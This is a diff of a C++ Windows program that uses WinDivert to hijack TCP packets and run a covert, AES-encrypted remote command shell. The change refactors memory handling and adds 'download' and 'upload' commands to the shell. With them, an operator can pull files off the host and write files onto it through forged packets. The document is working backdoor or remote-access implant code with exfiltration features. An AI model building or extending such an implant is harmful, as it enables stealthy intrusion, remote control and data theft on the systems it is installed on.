@@ -23,6 +23,7 @@ CServer::CServer()
 	m_addr_template = NULL; 
 	aes_set_key(&m_aes_ctx, key, 128);
 }
+
 CServer::~CServer()
 {
 
@@ -37,16 +38,11 @@ void CServer::start()
 
 	wait_for_connect();
 
-	PVOID packet;
 	UINT payload_len;
 	PVOID payload_buf;
 
-	packet = (UINT8*)malloc(WINDIVERT_MTU_MAX);
-	if (packet == NULL)
-	{
-		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
-		return;
-	}
+	char packet[WINDIVERT_MTU_MAX] = {};
+
 
 	while (TRUE)
 	{
@@ -81,7 +77,7 @@ void CServer::send_response_packet(PVOID packet, UINT recv_len)
 	tcp_header->AckNum = WinDivertHelperHtonl(original_seq);
 	WinDivertHelperCalcChecksums(packet, recv_len, NULL, 0);
 	UINT send_len = 0;
-	if (!WinDivertSend(m_divert_handle, packet, recv_len, &send_len, m_addr_template))
+	if (!WinDivertSend(m_divert_handle, packet, recv_len, &send_len, m_addr_template.get()))
 	{
 		cout << "[!] failed to send connect reponse packet (" << GetLastError() << ")!" << endl;
 	}
@@ -98,14 +94,14 @@ void CServer::set_packet_template(PVOID packet, UINT recv_len)
 		NULL, NULL, NULL, &tcp_header, NULL, NULL,
 		&payload_len, NULL, NULL);
 	m_template_packet_len = recv_len - payload_len;
-	m_packet_template = (UINT8*)malloc(m_template_packet_len);
+	m_packet_template = shared_ptr<char[]>(new char[m_template_packet_len] {});
 	if (m_packet_template == NULL)
 	{
 		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
 		return;
 	}
-	memcpy(m_packet_template, packet, m_template_packet_len);
-	WinDivertHelperParsePacket(m_packet_template, recv_len, &ip_header, NULL,
+	memcpy(m_packet_template.get(), packet, m_template_packet_len);
+	WinDivertHelperParsePacket(m_packet_template.get(), recv_len, &ip_header, NULL,
 		NULL, NULL, NULL, &tcp_header, NULL, NULL,
 		NULL, NULL, NULL);
 
@@ -125,53 +121,51 @@ void CServer::set_packet_template(PVOID packet, UINT recv_len)
 
 void CServer::set_addr_template(WINDIVERT_ADDRESS addr)
 {
-	m_addr_template = (PWINDIVERT_ADDRESS)malloc(sizeof(WINDIVERT_ADDRESS));
+	m_addr_template = make_shared<WINDIVERT_ADDRESS>();
 	if (m_addr_template == NULL)
 	{
 		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
 		return;
 	}
-	memcpy(m_addr_template, &addr, sizeof(WINDIVERT_ADDRESS));
+	memcpy(m_addr_template.get(), &addr, sizeof(WINDIVERT_ADDRESS));
 	m_addr_template->Outbound = 1;
 }
 
-void CServer::send_data_packet(const char* payload_buf)
+void CServer::send_data_packet(const char* payload_buf, int payload_len)
 {
 	PWINDIVERT_TCPHDR tcp_header;
 	PWINDIVERT_IPHDR ip_header;
-	UINT reponse_payload_len;
+	UINT response_payload_len;
 	PVOID reponse_payload_buf;
-	UINT8* reponse_packet;
 	UINT packet_len, send_len;
-	char* encrypt_buf;
 
-	reponse_payload_len = 16 * (strlen(payload_buf) / 16 + 1);
-	encrypt_buf = (char*)malloc(reponse_payload_len);
+	if (!payload_len)
+		payload_len = strlen(payload_buf);
+	response_payload_len = 16 * (payload_len / 16 + 1);
+	auto encrypt_buf = shared_ptr<char[]>(new char[response_payload_len]());
 	if (!encrypt_buf)
 	{
 		return;
 	}
-	memset(encrypt_buf, 0, reponse_payload_len);
-	memcpy(encrypt_buf, payload_buf, strlen(payload_buf));
-	encrypt_payload(encrypt_buf, reponse_payload_len);
+	memcpy(encrypt_buf.get(), payload_buf, payload_len);
+	encrypt_payload(encrypt_buf.get(), response_payload_len);
 
-	packet_len = m_template_packet_len + reponse_payload_len;
+	packet_len = m_template_packet_len + response_payload_len;
 	// build response packet
-	reponse_packet = (UINT8*)malloc(packet_len);
+	auto reponse_packet = unique_ptr<char[]>(new char[packet_len]());
 	if (!reponse_packet)
 	{
 		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
 		return;
 	}
-	ZeroMemory(reponse_packet, packet_len);
-	memcpy(reponse_packet, m_packet_template, m_template_packet_len);
+	memcpy(reponse_packet.get(), m_packet_template.get(), m_template_packet_len);
 
-	WinDivertHelperParsePacket(reponse_packet, packet_len, &ip_header, NULL,
+	WinDivertHelperParsePacket(reponse_packet.get(), packet_len, &ip_header, NULL,
 		NULL, NULL, NULL, &tcp_header, NULL, NULL,
 		NULL, NULL, NULL);
 
 	// rebuild ip header
-	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) + reponse_payload_len;
+	UINT16 ip_length = WinDivertHelperNtohs(ip_header->Length) + response_payload_len;
 	ip_header->Length = WinDivertHelperHtons(ip_length);
 
 	tcp_header->Psh = 1;
@@ -179,16 +173,15 @@ void CServer::send_data_packet(const char* payload_buf)
 	// pack new payload in
 	// cause template packet has no payload buf, we pos it manully. 
 	reponse_payload_buf = (PVOID)((UINT)tcp_header + sizeof(WINDIVERT_TCPHDR));
-	memcpy(reponse_payload_buf, encrypt_buf, reponse_payload_len);
-	free(encrypt_buf);
-	WinDivertHelperCalcChecksums(reponse_packet, packet_len, m_addr_template, 0);
+	memcpy(reponse_payload_buf, encrypt_buf.get(), response_payload_len);
+	WinDivertHelperCalcChecksums(reponse_packet.get(), packet_len, m_addr_template.get(), 0);
 
-	if (!WinDivertSend(m_divert_handle, reponse_packet, packet_len, &send_len, m_addr_template))
+	if (!WinDivertSend(m_divert_handle, reponse_packet.get(), packet_len, &send_len, m_addr_template.get()))
 	{
 		cout << "[!] failed to send data packet (" << GetLastError() << ")!" << endl;
 	}
 	cout << "[*] send data packet " << send_len << " bytes successfully!" << endl;
-	add_seq(reponse_payload_len);
+	add_seq(response_payload_len);
 }
 
 BOOL CServer::init_divert(const char* filter)
@@ -214,26 +207,31 @@ BOOL CServer::init_divert(const char* filter)
 void CServer::run_shell()
 {
 	init_shell();
-	PVOID packet;
 	UINT payload_len;
-	PVOID payload_buf;
+	char* payload_buf;
 
-	packet = malloc(WINDIVERT_MTU_MAX);
-	if (!packet)
-	{
-		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
-		return;
-	}
+	auto packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());
 
-	while (TRUE)
+	while (true)
 	{
-		recv_data_packet(packet, &payload_len, &payload_buf);
+		recv_data_packet(packet.get(), &payload_len, (PVOID*)&payload_buf);
 		if (payload_len && payload_buf)
 		{
-			DWORD real_write = 0;
-			if (!WriteFile(m_std_in_wr, (char*)payload_buf, payload_len, &real_write, NULL))
+			if (strstr(payload_buf, "download"))
 			{
-				cout << "[!] write data:"<< (char*)payload_buf << " error!" << endl;
+				download_file(payload_buf);
+				continue;
+			}			
+			if (strstr(payload_buf, "upload"))
+			{
+				upload_file(payload_buf);
+				continue;
+			}
+			DWORD real_write = 0;
+			strcpy(last_cmd, payload_buf);
+			if (!WriteFile(m_std_in_wr, payload_buf, payload_len, &real_write, NULL))
+			{
+				cout << "[!] write data:"<< payload_buf << " error!" << endl;
 			}
 		}
 	}
@@ -292,7 +290,7 @@ void CServer::add_seq(UINT seq)
 {
 	PWINDIVERT_TCPHDR tcp_header;
 
-	WinDivertHelperParsePacket(m_packet_template, m_template_packet_len, NULL, NULL,
+	WinDivertHelperParsePacket(m_packet_template.get(), m_template_packet_len, NULL, NULL,
 		NULL, NULL, NULL, &tcp_header, NULL, NULL,
 		NULL, NULL, NULL);
 
@@ -316,7 +314,7 @@ void CServer::send_connect_reponse(PVOID packet, UINT recv_len)
 	tcp_header->SeqNum = WinDivertHelperHtonl(100000);
 	WinDivertHelperCalcChecksums(packet, recv_len, NULL, 0);
 	UINT send_len = 0;
-	if (!WinDivertSend(m_divert_handle, packet, recv_len, &send_len, m_addr_template))
+	if (!WinDivertSend(m_divert_handle, packet, recv_len, &send_len, m_addr_template.get()))
 	{
 		cout << "[!] failed to send reponse packet (" << GetLastError() << ")!" << endl;
 	}
@@ -325,18 +323,22 @@ void CServer::send_connect_reponse(PVOID packet, UINT recv_len)
 
 unsigned __stdcall CServer::read_from_cmd(void* ptr)
 {
-	CServer* pThis = (CServer*)ptr;
-	uint8_t buff[2048];
-
+	CServer* pthis = (CServer*)ptr;
+	uint8_t buff[FILE_SIZE];
 	DWORD read_size;
 	while (true)
 	{
-		if (!ReadFile(pThis->m_std_out_rd, buff, 2047, &read_size, nullptr) || !read_size)
+		if (!ReadFile(pthis->m_std_out_rd, buff, FILE_SIZE - 1, &read_size, nullptr) || !read_size)
 		{
 			break;
 		}
 		buff[read_size] = 0;
-		pThis->send_data_packet((const char*)buff);
+
+		if (strlen((char*)buff) == strlen(pthis->last_cmd) && !strcmp((char*)buff, pthis->last_cmd))
+		{
+			continue;
+		}
+		pthis->send_data_packet((const char*)buff);
 	}
 
 	_endthreadex(0);
@@ -408,26 +410,22 @@ bool CServer::recv_data_packet(PVOID packet_buf, PUINT payload_len, PVOID *paylo
 
 void CServer::wait_for_connect()
 {
-	PVOID packet;
 	UINT recv_len;
 	WINDIVERT_ADDRESS addr;
 	PWINDIVERT_TCPHDR tcp_header;
 	PWINDIVERT_IPHDR ip_header;
 
-	packet = malloc(WINDIVERT_MTU_MAX);
-	if (packet == NULL)
-	{
-		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
-		return;
-	}
+	auto packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());
+	cout << "[*] waiting for connect..." << endl;
+
 	while (TRUE)
 	{
-		if (!WinDivertRecv(m_divert_handle, packet, WINDIVERT_MTU_MAX, &recv_len, &addr))
+		if (!WinDivertRecv(m_divert_handle, packet.get(), WINDIVERT_MTU_MAX, &recv_len, &addr))
 		{
 			continue;
 		}
 
-		WinDivertHelperParsePacket(packet, recv_len, &ip_header, NULL,
+		WinDivertHelperParsePacket(packet.get(), recv_len, &ip_header, NULL,
 			NULL, NULL, NULL, &tcp_header, NULL, NULL,
 			NULL, NULL, NULL);
 		if (ip_header)
@@ -441,10 +439,116 @@ void CServer::wait_for_connect()
 			{
 				cout << "[*] syn packet recv!" << endl;
 				set_addr_template(addr);
-				send_connect_reponse(packet, recv_len);
+				send_connect_reponse(packet.get(), recv_len);
 				break;
 			}
 		}
 	}
-	free(packet);
+}
+
+void CServer::download_file(string download_str)
+{
+	string word,src_file, dst_file;
+	if (download_str.empty())
+	{
+		return;
+	}
+
+	stringstream str_stream(download_str);
+	str_stream >> word;
+	str_stream >> src_file;
+	str_stream >> dst_file;
+
+	cout << "[*] download file " << src_file << " to " << dst_file << endl;
+	FILE* fp = fopen(src_file.c_str(), "rb");
+	if (!fp)
+	{
+		cout << "[!] failed to open file " << src_file << "  (" << GetLastError() << ")!" << endl;
+		send_data_packet("file_no_exist");
+		return;
+	}
+	send_data_packet("download_start");
+	size_t want_read = FILE_SIZE - sizeof(size_t) - 16;
+	auto file_buf = shared_ptr<char[]>(new char[want_read] {});
+	while (true)
+	{
+		size_t real_read = fread(file_buf.get() + 4, 1, want_read, fp);
+		if (real_read < 0)
+		{
+			cout << "[!] failed to read file " << src_file << " (" << GetLastError() << ")!" << endl;
+			return;
+		}
+		*(size_t*)file_buf.get() = real_read;
+		
+		send_data_packet(file_buf.get(), real_read + 4);
+		cout << "[*] send file data " << real_read << " bytes finish" << endl;
+		wait_for_recv();
+		if (want_read > real_read)
+		{
+			cout << "[*] download file " << src_file << " to " << dst_file << " finish" << endl;
+			send_data_packet("download_finish");
+			return;
+		}
+	}
+}
+
+void CServer::upload_file(string upload_str)
+{
+	string word, src_file, dst_file;
+	UINT payload_len;
+	char* payload_buf;
+	auto packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());
+	if (upload_str.empty())
+	{
+		return;
+	}
+
+	stringstream str_stream(upload_str);
+	str_stream >> word;
+	str_stream >> src_file;
+	str_stream >> dst_file;
+
+	cout << "[*] upload file" << src_file << "to" << dst_file << endl;
+	auto fp = fopen(dst_file.c_str(), "wb");
+	if (!fp)
+	{
+		cout << "[!] failed to open file buffer (" << GetLastError() << ")!" << endl;
+		return;
+	}
+	send_data_packet("upload_start");
+	while (true)
+	{
+		recv_data_packet(packet.get(), &payload_len, (PVOID*)&payload_buf);
+		if (!strcmp(payload_buf, "upload_finish"))
+		{
+			cout << "[*] finish upload" << endl;
+			fclose(fp);
+			return;
+		}
+		size_t len = *(size_t*)payload_buf;
+		cout << "[*] recv file data " << len << " bytes" << endl;
+		fwrite(payload_buf + 4, len, 1, fp);
+		send_data_packet("recv_ok");
+	}
+}
+
+void CServer::wait_for_recv()
+{
+	UINT payload_len;
+	PVOID payload_buf;
+
+	auto packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());
+
+	while (TRUE)
+	{
+		recv_data_packet(packet.get(), &payload_len, &payload_buf);
+		if (payload_len && payload_buf)
+		{
+			if (payload_len >= strlen("recv_ok") && !memcmp(payload_buf, "recv_ok", strlen("recv_ok")))
+			{
+				cout << "[*] recv ok" << endl;
+				return;
+			}
+		}
+	}
 }
